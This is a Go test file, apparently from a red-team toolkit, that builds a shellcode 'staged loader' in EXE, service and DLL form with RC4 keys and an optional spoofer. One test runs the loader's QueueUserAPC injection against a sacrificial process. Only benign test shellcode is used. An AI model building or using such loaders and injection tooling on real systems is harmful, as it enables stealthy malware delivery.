//go:build windows && amd64

package modules

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"

	"golang.org/x/sys/windows"
)

// stagedLoaderRequireTools skips the build tests when the basic toolchain is
// not on PATH. The cross compiler itself is resolved by stagedLoaderCC.
func stagedLoaderRequireTools(t *testing.T) {
	t.Helper()
	for _, tool := range []string{"bash", "cc", "nasm"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skipf("skipping: %s not found in PATH", tool)
		}
	}
}

// stagedLoaderCC returns the --cc arguments that pin build.sh to a cross
// compiler available here, or nil to keep its default (`zig cc`). CI only has
// the mingw shims, so the tests use them there instead of pulling zig; a host
// that has zig exercises the production default.
func stagedLoaderCC(t *testing.T, arch string) []string {
	t.Helper()
	if _, err := exec.LookPath("zig"); err == nil {
		return nil
	}
	name := "x86_64-w64-mingw32-gcc"
	if arch == "x86" {
		name = "i686-w64-mingw32-gcc"
	}
	if _, err := exec.LookPath(name); err != nil {
		t.Skipf("skipping: neither zig nor %s is on PATH", name)
	}
	return []string{"--cc", name}
}

// stagedLoaderRequireX86 skips when the 32-bit MinGW toolchain is absent. The
// APC-injection test compiles a native 32-bit victim with it directly.
func stagedLoaderRequireX86(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("i686-w64-mingw32-gcc"); err != nil {
		t.Skipf("skipping: i686-w64-mingw32-gcc not found in PATH")
	}
}

// stagedLoaderBuildArch runs build.sh with an explicit --arch. stagedLoaderBuild
// pins --arch x64, so 32-bit regressions need their own entry point.
func stagedLoaderBuildArch(t *testing.T, dir, arch, scPath, out string, extra ...string) {
	t.Helper()
	args := []string{"./build.sh", "--shellcode", scPath, "--output", out, "--arch", arch}
	args = append(args, stagedLoaderCC(t, arch)...)
	args = append(args, extra...)
	cmd := exec.Command("bash", args...)
	cmd.Dir = dir
	if o, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("build.sh --arch %s %v failed: %v\n%s", arch, extra, err, o)
	}
}

// stagedLoaderBuild runs build.sh with the given extra flags and fails the
// test on error. scPath/out are the required --shellcode/--output values.
func stagedLoaderBuild(t *testing.T, dir, scPath, out string, extra ...string) {
	t.Helper()
	args := []string{"./build.sh", "--shellcode", scPath, "--output", out, "--arch", "x64"}
	args = append(args, stagedLoaderCC(t, "x64")...)
	args = append(args, extra...)
	cmd := exec.Command("bash", args...)
	cmd.Dir = dir
	if o, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("build.sh %v failed: %v\n%s", extra, err, o)
	}
}

// checkStagedLoaderPEMachine asserts a built artifact is a PE for the given
// COFF machine type.
func checkStagedLoaderPEMachine(t *testing.T, path string, machine uint16) {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	if !bytes.HasPrefix(data, []byte("MZ")) {
		t.Fatalf("%s is not a PE (missing MZ)", path)
	}
	peOff := binary.LittleEndian.Uint32(data[0x3c:])
	if int(peOff)+6 > len(data) {
		t.Fatalf("%s: truncated PE header", path)
	}
	if got := binary.LittleEndian.Uint16(data[peOff+4:]); got != machine {
		t.Fatalf("%s machine = 0x%x, want 0x%x", path, got, machine)
	}
}

// checkStagedLoaderPE asserts a built artifact is an amd64 PE.
func checkStagedLoaderPE(t *testing.T, path string) {
	t.Helper()
	checkStagedLoaderPEMachine(t, path, 0x8664)
}

// TestStagedLoaderBuildFormats builds every host container (service exe,
// plain exe, DLL) from the same packed stage and checks each is a valid amd64
// PE. The DLL must export Run.
func TestStagedLoaderBuildFormats(t *testing.T) {
	stagedLoaderRequireTools(t)
	dir := stagedLoaderDir(t)
	tmp := t.TempDir()

	scPath := filepath.Join(tmp, "agent.exe.bin")
	plain := make([]byte, 200000)
	for i := range plain {
		plain[i] = byte((i*13 + 7) % 256)
	}
	if err := os.WriteFile(scPath, plain, 0o600); err != nil {
		t.Fatalf("write shellcode fixture: %v", err)
	}
	keyHex := "feedfacecafebeefdeadbeef01234567"

	svc := filepath.Join(tmp, "staged_loader.exe")
	stagedLoaderBuild(t, dir, scPath, svc, "--key", keyHex)
	checkStagedLoaderPE(t, svc)

	exe := filepath.Join(tmp, "staged_loader_plain.exe")
	stagedLoaderBuild(t, dir, scPath, exe, "--key", keyHex, "--format", "exe")
	checkStagedLoaderPE(t, exe)

	// --smw off must build without the spoofer (and without nasm).
	noSmw := filepath.Join(tmp, "staged_loader_nosmw.exe")
	stagedLoaderBuild(t, dir, scPath, noSmw, "--key", keyHex, "--smw", "off")
	checkStagedLoaderPE(t, noSmw)

	dllPath := filepath.Join(tmp, "staged_loader.dll")
	stagedLoaderBuild(t, dir, scPath, dllPath, "--key", keyHex, "--format", "dll")
	checkStagedLoaderPE(t, dllPath)

	dll, err := windows.LoadDLL(dllPath)
	if err != nil {
		t.Fatalf("LoadDLL(%s): %v", dllPath, err)
	}
	// Release before t.TempDir cleanup so the file is not still mapped.
	defer func() {
		if relErr := dll.Release(); relErr != nil {
			t.Logf("release %s: %v", dllPath, relErr)
		}
	}()
	if _, err := dll.FindProc("Run"); err != nil {
		t.Fatalf("DLL export Run not found: %v", err)
	}
}

// TestStagedLoaderBuildFormatsX86 builds every host container for the 32-bit
// target. This is the regression guard for the i386 stage_data.S symbol
// decoration: without the underscore-prefixed names the link fails for all
// three formats with "undefined reference to staged_loader_stage_start".
func TestStagedLoaderBuildFormatsX86(t *testing.T) {
	stagedLoaderRequireTools(t)
	stagedLoaderRequireX86(t)
	dir := stagedLoaderDir(t)
	tmp := t.TempDir()

	scPath := filepath.Join(tmp, "agent32.bin")
	plain := make([]byte, 200000)
	for i := range plain {
		plain[i] = byte((i*13 + 7) % 256)
	}
	if err := os.WriteFile(scPath, plain, 0o600); err != nil {
		t.Fatalf("write shellcode fixture: %v", err)
	}

	svc := filepath.Join(tmp, "staged_loader_x86.exe")
	stagedLoaderBuildArch(t, dir, "x86", scPath, svc)
	checkStagedLoaderPEMachine(t, svc, 0x14c)

	plainExe := filepath.Join(tmp, "staged_loader_x86_plain.exe")
	stagedLoaderBuildArch(t, dir, "x86", scPath, plainExe, "--format", "exe")
	checkStagedLoaderPEMachine(t, plainExe, 0x14c)

	dllPath := filepath.Join(tmp, "staged_loader_x86.dll")
	stagedLoaderBuildArch(t, dir, "x86", scPath, dllPath, "--format", "dll")
	checkStagedLoaderPEMachine(t, dllPath, 0x14c)
}

// TestStagedLoaderAPCInjectionX86 is a runtime regression for the Win32
// QueueUserAPC fallback. The old code passed the thread handle as the APC
// routine and the routine as the thread handle, so every 32-bit injection
// (which always uses the fallback) failed with ERROR_INVALID_HANDLE before
// resuming the thread. The one-byte `ret` shellcode is enough: the loader only
// has to queue the APC and resume the suspended thread successfully.
// --verify-ms 0 avoids the liveness wait; the parked victim is killed after.
func TestStagedLoaderAPCInjectionX86(t *testing.T) {
	stagedLoaderRequireTools(t)
	stagedLoaderRequireX86(t)
	dir := stagedLoaderDir(t)
	tmp := t.TempDir()

	// A sacrificial victim with a unique image name, so the cleanup below can
	// kill the parked process without touching unrelated ones.
	victimName := fmt.Sprintf("sl_victim_%d.exe", os.Getpid())
	victimPath := filepath.Join(tmp, victimName)
	victimSrc := filepath.Join(tmp, "victim.c")
	if err := os.WriteFile(victimSrc, []byte(
		"#include <windows.h>\nint main(void){Sleep(60000);return 0;}\n"), 0o600); err != nil {
		t.Fatalf("write victim source: %v", err)
	}
	cc, err := exec.LookPath("i686-w64-mingw32-gcc")
	if err != nil {
		t.Fatalf("look up i686-w64-mingw32-gcc: %v", err)
	}
	if out, err := exec.Command(cc, "-O2", "-o", victimPath, victimSrc).CombinedOutput(); err != nil {
		t.Fatalf("build victim: %v\n%s", err, out)
	}
	// Kill the parked sacrificial even if an assertion fails below.
	defer func() { _ = exec.Command("taskkill", "/F", "/IM", victimName).Run() }()

	scPath := filepath.Join(tmp, "ret.bin")
	if err := os.WriteFile(scPath, []byte{0xc3}, 0o600); err != nil {
		t.Fatalf("write shellcode: %v", err)
	}

	loader := filepath.Join(tmp, "staged_loader_x86.exe")
	stagedLoaderBuildArch(t, dir, "x86", scPath, loader,
		"--format", "exe", "--process", victimPath, "--verify-ms", "0")

	// The parked victim inherits the loader's stdio, so a CombinedOutput pipe
	// would stay open until the victim exits. Leave stdio nil (os.DevNull) and
	// bound the run with a context timeout.
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	if err := exec.CommandContext(ctx, loader).Run(); err != nil {
		t.Fatalf("x86 loader failed (APC fallback regression?): %v", err)
	}
}

// TestStagedLoaderRebuildPicksUpNewShellcode is a regression for the Zig
// global build cache. build.sh regenerates stage_data.S and pulls the real
// stage/payload/key in with .incbin, which Zig does not treat as a cache
// input; before build.sh stamped stage_data.S with a per-build marker, a
// second build reused the first build's stage_data.o and embedded the old
// shellcode. Two builds with the same RC4 key and different shellcode must
// therefore produce different hosts.
func TestStagedLoaderRebuildPicksUpNewShellcode(t *testing.T) {
	if _, err := exec.LookPath("zig"); err != nil {
		t.Skip("skipping: zig not on PATH (regression is specific to the Zig cache)")
	}
	for _, tool := range []string{"bash", "cc"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skipf("skipping: %s not found in PATH", tool)
		}
	}
	dir := stagedLoaderDir(t)
	tmp := t.TempDir()

	sc1 := filepath.Join(tmp, "one.bin")
	sc2 := filepath.Join(tmp, "two.bin")
	if err := os.WriteFile(sc1, bytes.Repeat([]byte{0x11}, 4096), 0o600); err != nil {
		t.Fatalf("write first shellcode: %v", err)
	}
	if err := os.WriteFile(sc2, bytes.Repeat([]byte{0x22}, 8192), 0o600); err != nil {
		t.Fatalf("write second shellcode: %v", err)
	}

	// Same key so a stale cache reproduces the first host byte-for-byte.
	const key = "000102030405060708090a0b0c0d0e0f"
	out1 := filepath.Join(tmp, "one.exe")
	out2 := filepath.Join(tmp, "two.exe")
	stagedLoaderBuild(t, dir, sc1, out1, "--format", "exe", "--smw", "off", "--key", key)
	stagedLoaderBuild(t, dir, sc2, out2, "--format", "exe", "--smw", "off", "--key", key)

	b1, err := os.ReadFile(out1)
	if err != nil {
		t.Fatalf("read first host: %v", err)
	}
	b2, err := os.ReadFile(out2)
	if err != nil {
		t.Fatalf("read second host: %v", err)
	}
	if bytes.Equal(b1, b2) {
		t.Fatalf("second build reused the first build's embedded shellcode; stage_data.o hit a stale Zig cache")
	}
}
